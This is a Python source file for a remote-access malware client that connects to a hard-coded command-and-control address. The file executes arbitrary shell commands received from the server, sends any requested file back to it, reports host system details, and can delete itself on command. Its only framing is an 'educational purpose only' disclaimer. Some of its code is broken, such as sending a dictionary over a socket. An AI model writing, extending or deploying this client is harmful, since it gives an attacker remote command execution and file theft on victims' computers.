#!/usr/bin/env python

__author__ = "_rekcah_"
__desc__   = "For educational purpose only :)"

import socket, select, sys
import subprocess
import os
from os import remove
from sys import argv
import platform

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def prompt():
    sys.stdout.write('<You> ')
    sys.stdout.flush()

def parse_command(msg):
    global  s
    cmd = str(msg).upper()
    # Parsing commands with arguments
    if cmd == "KILL" :
        print(O + "[!] Closing the client..." + W)
        sys.exit(0)
    elif cmd == "REMOVE" :
        remove(argv[0])
    elif cmd == "GETINFO" :
        info = {"architecture" : platform.machine(), "system" : platform.system(), "uname" : platform.uname(), "release" : platform.release(),
                "sys_ver" : platform.version()}
        s.send(info)
    else :
        sub = cmd.split(" ")
        if sub[0] == "SHELL" :
            os.system(sub[1])
        elif sub[0] == "GETFILE" :
            if os.path.isfile((str(msg).split(" "))[1]) :
                path = (str(msg).split(" "))[1]
                fp = open(path, "rb")
                s.send(fp.read())
                print(G + "[+] File sent to C&C" + W)
            else :
                print(R + "[-] File not sent to C&C" + W)
        elif sub[0] == "KILL" :
            sys.exit(0)

if __name__ == "__main__":

    # if len(sys.argv) < 3 :
    #     print(O + "[!] Usage : python client_backup.py [C&C IP] [C&C Port]" + W)
    #     sys.exit()

    # host = sys.argv[1]
    # port = int(sys.argv[2])

    host = "10.94.73.27"
    port = 5010

    s.settimeout(2)

    # connect to the C&C
    try :
        print(B + "[*] knocking to the heavens doors..." + W)

        # port knocking code here (EVENTUALLY :P )

        s.connect((host, port))

        # end port knocking code
    except :
        print(R + "[-] Unable to connect to the C&C server..." + W)
        print(R + "[-] Exiting..." + W)
        sys.exit()

    print(G + "[+] Connected to C&C. Waiting for instructions..." + W)
    # prompt()

    while 1:
        socket_list = [sys.stdin, s]

        # Get the list sockets which are readable
        read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])

        for sock in read_sockets:
            #incoming command/data from remote server
            if sock == s:
                data = sock.recv(4096)
                if not data :
                    print(R + "[-] Disconnected from the C&C" + W)
                    sys.exit()
                else :
                    #print data
                    sys.stdout.write(data)
                    #parse the response
                    parse_command(data)
                    # prompt()
            #user entered a message
            else :
                msg = sys.stdin.readline()
                s.send(msg)
                # prompt()
    input("prompt...")
